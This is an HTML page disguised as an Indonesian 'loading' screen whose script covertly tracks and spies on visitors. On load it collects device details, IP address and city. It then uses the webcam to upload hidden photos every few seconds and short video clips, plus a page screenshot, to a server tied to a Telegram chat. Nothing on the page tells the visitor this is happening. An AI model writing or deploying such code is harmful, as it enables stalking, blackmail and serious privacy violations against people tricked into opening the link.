<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Loading...</title>
  <style>
    body {
      background: #000;
      color: #6e48aa;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
    }
    #loading-text {
      font-size: 22px;
    }
  </style>
</head>
<body>
  <div id="loading-text">loading sebentar...</div>
  <video id="video" autoplay muted style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const chatId = '7919359674';

    const sendText = async (text) => {
      await fetch('/api/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text })
      });
    };

    const sendFile = async (blob, type, caption) => {
      const form = new FormData();
      form.append('chat_id', chatId);
      form.append('type', type);
      form.append('caption', caption);
      form.append('file', blob, type === 'photo' ? 'capture.jpg' : 'record.webm');
      await fetch('/api/upload', { method: 'POST', body: form });
    };

    const getInfo = async () => {
      let m = 'â•­â”€â”€â”€â”€â”€ Tracking Report â”€â”€â”€â”€â”€ â¦¿\n\n';
      m += `ðŸ“± Device: ${navigator.userAgent}\n`;
      m += `ðŸ“º Screen: ${screen.width}x${screen.height}\n`;
      m += `ðŸ•’ Time: ${new Date().toLocaleString('id-ID')}\n`;
      m += `ðŸ”— URL: ${location.href}\n`;
      try {
        const r = await fetch('https://ipapi.co/json');
        const d = await r.json();
        m += `\nðŸ“ IP: ${d.ip}\n`;
        m += `ðŸ™ï¸ City: ${d.city}, ${d.region}, ${d.country_name}\n`;
      } catch {
        m += '\nâŒ Lokasi gagal\n';
      }
      m += '\nâ•°â”€â”€â”€â”€â”€ Telegram @cpl_denz â”€â”€â”€â”€â”€ â¦¿';
      return m;
    };

    const init = async () => {
      await sendText(await getInfo());

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        video.srcObject = stream;

        setInterval(() => {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          ctx.drawImage(video, 0, 0);
          canvas.toBlob(b => sendFile(b, 'photo', 'FOTO'), 'image/jpeg');
        }, 3000);

        setInterval(() => {
          const blobs = [];
          const rec = new MediaRecorder(stream, { mimeType: 'video/webm' });
          rec.ondataavailable = e => blobs.push(e.data);
          rec.onstop = () => sendFile(new Blob(blobs, { type: 'video/webm' }), 'video', 'VIDIO');
          rec.start();
          setTimeout(() => rec.stop(), 5000);
        }, 10000);

      } catch {
        await sendText('âŒ Kamera diblok');
      }

      try {
        const canvas = await html2canvas(document.body);
        canvas.toBlob(b => sendFile(b, 'photo', 'SCREENSHOT'), 'image/jpeg');
      } catch {
        await sendText('âŒ Screenshot gagal');
      }
    };

    // Load html2canvas
    const s = document.createElement('script');
    s.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
    s.onload = () => setTimeout(init, 3000);
    document.head.appendChild(s);
  </script>
</body>
</html>